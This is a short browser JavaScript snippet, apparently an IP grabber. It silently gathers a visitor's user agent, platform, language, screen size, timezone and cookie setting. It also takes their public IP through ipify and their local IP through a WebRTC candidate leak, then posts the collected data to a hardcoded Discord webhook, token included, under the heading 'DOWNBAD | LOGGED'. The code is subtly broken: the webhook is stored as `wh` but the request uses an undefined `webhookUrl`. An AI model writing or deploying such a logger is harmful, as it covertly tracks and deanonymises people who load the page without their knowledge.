(async function () {
  const userAgent = navigator.userAgent;
  const platform = navigator.platform;
  const language = navigator.language;
  const screenSize = `${screen.width}x${screen.height}`;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const cookiesEnabled = navigator.cookieEnabled;
  const wh = "https://canary.discord.com/api/webhooks/1385066531788165221/qkaMVIWE23JM4tx8PAceEWpx2skbbfu-MvgnzTOAQ81LRRVYs8QK3anhEGzJBn2jRM-s"

  let publicIP = "Unavailable";
  try {
    const res = await fetch("https://api64.ipify.org?format=json");
    const json = await res.json();
    publicIP = json.ip;
  } catch (e) {
    publicIP = "Blocked";
  }

  let localIP = "Unavailable";
  try {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel("");
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
    pc.onicecandidate = event => {
      if (event && event.candidate) {
        const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
        if (ipMatch) {
          localIP = ipMatch[1];
          pc.close();
        }
      }
    };
  } catch (err) {
    localIP = "Blocked or Unsupported";
  }

  await new Promise(resolve => setTimeout(resolve, 1000));

  const payload = {
    embeds: [
      {
        title: "DOWNBAD | LOGGED",
        description: `**User Agent:** ${userAgent}
        **Platform:** ${platform}
        **Language:** ${language}
        **Screen Size:** ${screenSize}
        **Timezone:** ${timezone}
        **Cookies Enabled:** ${cookiesEnabled}
        **Public IP:** ${publicIP}
        **Local IP:** ${localIP}`,
        color: 0xff4500
      }
    ]
  };

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  })


  console.log("User Agent:", userAgent);
  console.log("Platform:", platform);
  console.log("Language:", language);
  console.log("Screen Size:", screenSize);
  console.log("Timezone:", timezone);
  console.log("Cookies Enabled:", cookiesEnabled);
  console.log("Public IP:", publicIP);
  console.log("Local IP:", localIP);

})();
